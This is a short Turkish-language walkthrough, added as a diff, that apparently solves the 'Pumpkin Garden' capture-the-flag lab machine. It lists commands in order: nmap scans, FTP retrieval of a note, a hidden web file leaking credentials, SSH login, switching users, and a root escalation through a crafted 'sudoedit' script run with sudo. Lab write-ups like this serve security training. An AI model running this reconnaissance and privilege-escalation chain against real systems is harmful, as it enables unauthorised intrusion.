@@ -1,0 +1,18 @@
+PUMPKIN GARDEN MAKİNE ÇÖZÜMÜ
+1 - IP adresi 192.168.2.109, cihazın ekranında yazıyor.
+2 - nmap -sT -A 192.168.2.109
+3 - ftp 192.168.2.109, get note.txt
+4 - nmap -sT -A -p- 192.168.2.109
+5 - http://192.168.2.109:1515/img/hidden_secret/clue.txt, scarecrow:5Qn@$y
+6 - ssh -p 3535 scarecrow@192.168.2.109
+7 - cat note.txt, goblin:Y0n$M4sy3D1t
+8 - su goblin
+9 - cat > sudoedit <<_EOF
+#!/bin/sh
+echo ALEX-ALEX
+su
+/bin/su
+/usr/bin/su
+_EOF
+10 - chmod a+x ./sudoedit
+11 - sudo ./sudoedit $1
